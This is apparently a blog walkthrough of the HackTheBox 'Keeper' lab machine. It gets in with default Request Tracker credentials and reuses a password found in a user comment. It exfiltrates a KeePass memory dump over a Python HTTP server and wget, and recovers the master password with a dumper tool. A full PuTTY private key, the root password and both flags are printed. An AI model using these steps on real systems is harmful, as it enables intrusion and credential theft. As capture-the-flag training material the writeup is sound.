---
slug: keeper
hide:
    - navigation
tags:
    - HackTheBox
    - Writeups
    - Walkthrough
    - Linux
    - Web
    - KeePass
---

[:octicons-arrow-left-24: Back to HackTheBox Writeups](./index.md){ .sm-button }

# **Keeper**


![](https://live.staticflickr.com/65535/53503514962_9921579357_c.jpg){loading=lazy}

??? info "Information"
    **Machine**: [Keeper](https://app.hackthebox.com/machines/556)  
    **Level**: `Easy`  
    **Tags**: `Linux`, `Web`, `KeePass`  
    **Pwn**: [Pwned by 0xrh0d4m1n](https://www.hackthebox.com/achievement/machine/1013077/556)

---

## 🚀 **Starting**

```bash
echo '10.10.11.227 keeper.htb' | sudo tee -a /etc/hosts
```

---

## 🔭 **Reconnaissance**

Starting with Nmap
```bash
sudo nmap -sV -sC -T4 -A -O -f -Pn --top-ports 1000 -oN top1k.nmap 10.10.11.227
```

Nmap results for the top 1000 most important ports
```log
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-27 12:23 EST
Nmap scan report for 10.10.11.227
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/27%OT=22%CT=1%CU=31224%PV=Y%DS=2%DC=T%G=Y%TM=658
OS:C5DA7%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A
OS:)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10B%T
OS:I=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=
OS:M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE
OS:88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%
OS:DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=
OS:G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   192.42 ms 10.10.14.1
2   192.82 ms 10.10.11.227

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.54 seconds
```

A brief look into HTTP Headers
```bash
curl -X GET -Ik http://keeper.htb/           
```
```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 27 Dec 2023 17:27:07 GMT
Content-Type: text/html
Content-Length: 149
Last-Modified: Wed, 24 May 2023 14:04:44 GMT
Connection: keep-alive
ETag: "646e197c-95"
Accept-Ranges: bytes
```

In the browser we reached to this page  
![](https://live.staticflickr.com/65535/53505967308_9e4caed389_o.png){.maxH300 loading=lazy}

When clicked in the link from the previous page we get redirected to this `tickets` subdomain, which is presented to us by some tech named `RT v4.4.4`. After some research, I discovered that it is an application named "Request Tracker" used to manage Ticket Requests   
![](https://live.staticflickr.com/65535/53506238490_662d91c33c_o.png){.maxH300 loading=lazy}

Since we are in a login page, we could try to search for some "default credentials", there are some threads on the internet talking about this, most of them are saying that default credentials are `root:password`.  
![](https://live.staticflickr.com/65535/53506238545_d2fe11a012_o.png){.maxH300 loading=lazy}

So, I tried the default credentials to give a try.  
![](https://live.staticflickr.com/65535/53505967328_5cebbaf4c2_o.png){.maxH300 loading=lazy}

And Voilà, we are in!  
![](https://live.staticflickr.com/65535/53505967318_24b7ec2a49_o.png){.maxH300 loading=lazy}

After a good time sniffing the application, I found this user list which has two users only: `lnorgaard@keeper.htb` and `root@localhost`    
![](https://live.staticflickr.com/65535/53504930402_da2e61290f_o.png){.maxH300 loading=lazy}

When clicking into `lnorgaard` user, we can spot a very useful information on the comments, default password `Welcome2023!`    
![](https://live.staticflickr.com/65535/53504930412_1439df69cf_o.png){.maxH300 loading=lazy}

Also, I found this interesting ticket  
![](https://live.staticflickr.com/65535/53505815826_03a15fcd3b_o.png){.maxH300 loading=lazy}

Which had an invaluable information, a Keeypass Dump file in the home directory of user `lnorgaard`  
![](https://live.staticflickr.com/65535/53504930362_f80fe488cc_o.png){.maxH300 loading=lazy}

### **Initial Access**

> :thought_balloon: _Sometimes reconnaissance can be very impressive! A good recon saves you a lot of time!_

We know the user `lnorgaard` and we know a password `Welcome2023!`, let's try a SSH access:
```bash
ssh lnorgaard@keeper.htb              
The authenticity of host 'keeper.htb (10.10.11.227)' can't be established.
ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'keeper.htb' (ED25519) to the list of known hosts.
lnorgaard@keeper.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ 
lnorgaard@keeper:~$ ll
total 85380
drwxr-xr-x 4 lnorgaard lnorgaard     4096 Jul 25 20:00 ./
drwxr-xr-x 3 root      root          4096 May 24  2023 ../
lrwxrwxrwx 1 root      root             9 May 24  2023 .bash_history -> /dev/null
-rw-r--r-- 1 lnorgaard lnorgaard      220 May 23  2023 .bash_logout
-rw-r--r-- 1 lnorgaard lnorgaard     3771 May 23  2023 .bashrc
drwx------ 2 lnorgaard lnorgaard     4096 May 24  2023 .cache/
-rw------- 1 lnorgaard lnorgaard      807 May 23  2023 .profile
-rw-r--r-- 1 root      root      87391651 Dec 27 19:50 RT30000.zip
drwx------ 2 lnorgaard lnorgaard     4096 Jul 24 10:25 .ssh/
-rw-r----- 1 root      lnorgaard       33 Dec 27 17:48 user.txt
-rw-r--r-- 1 root      root            39 Jul 20 19:03 .vimrc

```

### **User Flag**  

What!? We just got he first flag! Easy peasy lemon squeezy! This one was pretty quick! Thanks Recon :heart_exclamation:  
```bash
lnorgaard@keeper:~$ cat user.txt
#* * * ALERT * * * * * * * * * * * * * * * * 
#* If you really want to see this flag, go * 
#* to FLAG CODES at the bottom of the page *
#* * * * * * * * * * * * * * * * * * * * * *
```

---

## 🪲 **Vulnerability Scan**

We know that this user has stored a Keypass Dump file into home directory. Looking into the user files, one file got my attention:
```bash
-rw-r--r-- 1 root      root      87391651 Dec 27 19:50 RT30000.zip
```

Let's ex-filtrate this file to get a look into it:
```bash
lnorgaard@keeper:~$ python3 -m http.server 12345
Serving HTTP on 0.0.0.0 port 12345 (http://0.0.0.0:12345/) ...
10.10.14.12 - - [27/Dec/2023 19:57:27] "GET /RT30000.zip HTTP/1.1" 200 -
```

Getting the file from the Attacker Machine
```bash
wget http://10.10.11.227:12345/RT30000.zip
--2023-12-27 13:57:28--  http://10.10.11.227:12345/RT30000.zip
Connecting to 10.10.11.227:12345... connected.
HTTP request sent, awaiting response... 200 OK
Length: 87391651 (83M) [application/zip]
Saving to: ‘RT30000.zip’

RT30000.zip                  100%[===========================================>]  83.34M   754KB/s    in 5m 1s   

2023-12-27 14:02:30 (283 KB/s) - ‘RT30000.zip’ saved [87391651/87391651]
```

Extracting the `.zip`
```bash
unzip RT30000.zip -d RT30000     
Archive:  RT30000.zip
  inflating: RT30000/KeePassDumpFull.dmp  
 extracting: RT30000/passcodes.kdbx 
cd RT30000                         
ll
total 247464
-rwxr-x--- 1 user user 253395188 May 24  2023 KeePassDumpFull.dmp
-rwxr-x--- 1 user user      3630 May 24  2023 passcodes.kdbx
```

Great, a KeePass dump file! From this point we have a vulnerability which is pretty simple to exploit.  

---

## 🎯 **Exploit**

First, I tried to use `strings` to get a brief look into the `.dmp` file, but, it caused too much noise, which was not a good approach. 

So, I started to search for some tool for rescue me in this case. Then, I found this one:  
![](https://live.staticflickr.com/65535/53505967333_d5724ce29d_o.png){.maxH300 loading=lazy}

Downloading the tool
```bash
git clone https://github.com/vdohney/keepass-password-dumper
```

After running the tool I got the following output, this one got me a good time, I was trying to understand the output...
```
keepass_pwd_dumper KeePassDumpFull.dmp

Password candidates (character positions):
Unknown characters are displayed as "●"
1.:	●
2.:	ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M, 
3.:	d, 
4.:	g, 
5.:	r, 
6.:	ø, 
7.:	d, 
8.:	 , 
9.:	m, 
10.:	e, 
11.:	d, 
12.:	 , 
13.:	f, 
14.:	l, 
15.:	ø, 
16.:	d, 
17.:	e, 
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
```

So, many minutes later, I figured out to search in google for `dgrød med fløde`, but this was crazy, because I was receiving `rødgrød med fløde`as suggestion to me, and the results were showing a danish crazy candy... _Probably very delicious hahaha_

Then, I have used [this website](https://app.keeweb.info/) to upload the `.kdbx` file to try to open it using this crazy password: `rødgrød med fløde`

And guess what? It worked!!! hahaha  
![](https://live.staticflickr.com/65535/53504930417_4f4cdc3024_o.png){.maxH300 loading=lazy}

I got a `root` password `F4><3K0nd!`

I tried to use this credentials to login at SSH but I got rick-rolled!  

But I still have a `PuTTY File`, so I could try to export this key to use it to make a SSH login using it.
```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

Exporting Keys! _If you don't have this `puttygen`, just install `putty-tools`_
```bash
puttygen putty-private-key.ppk -O private-openssh -o putty-ssh-key.pem
ll
total 85360
drwxr-xr-x 2 user user     4096 Dec 27 14:04 RT30000
-rw-r--r-- 1 user user 87391651 Dec 27 13:56 RT30000.zip
-rw-r--r-- 1 user user     1458 Dec 27 16:56 putty-private-key.ppk
-rw------- 1 user user     1675 Dec 27 16:56 putty-ssh-key.pem
-rw-r--r-- 1 root root     1928 Dec 27 12:23 top1k.nmap
```

Time to use the key file, cross your fingers...
```bash
ssh root@keeper.htb -i ./putty-ssh-key.pem
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41

root@keeper:~# whoami
root
```
...and it is done! We are root!

---

## 🏁 **Flag Exfiltration**

### **Root Flag**

```
root@keeper:~# ll /root
total 85384
drwx------  5 root root     4096 Dec 27 17:48 ./
drwxr-xr-x 18 root root     4096 Jul 27 13:52 ../
lrwxrwxrwx  1 root root        9 May 24  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root     3106 Dec  5  2019 .bashrc
drwx------  2 root root     4096 May 24  2023 .cache/
-rw-------  1 root root       20 Jul 27 13:57 .lesshst
lrwxrwxrwx  1 root root        9 May 24  2023 .mysql_history -> /dev/null
-rw-r--r--  1 root root      161 Dec  5  2019 .profile
-rw-r-----  1 root root       33 Dec 27 17:48 root.txt
-rw-r--r--  1 root root 87391651 Jul 25 19:56 RT30000.zip
drwxr-xr-x  2 root root     4096 Jul 25 20:11 SQL/
drwxr-xr-x  2 root root     4096 May 24  2023 .ssh/
-rw-r--r--  1 root root       39 Jul 20 19:03 .vimrc
root@keeper:~# cat /root/root.txt 
#* * * ALERT * * * * * * * * * * * * * * * * 
#* If you really want to see this flag, go * 
#* to FLAG CODES at the bottom of the page *
#* * * * * * * * * * * * * * * * * * * * * *
```

### Flag Codes
??? question "**Reveal Flags** 🏁"
    #### **User Flag**
        d3c5f430c7468430d3359cf169d84149
    #### **Root Flag**
        dd4a3509476abe6ef0cd0a35a79d14c3

---

#### *If this was helpful in someway, [you can **support me** by zapping me some sats](https://getalby.com/p/0xrh0d4m1n)!*
#### *See you in the next writeup!*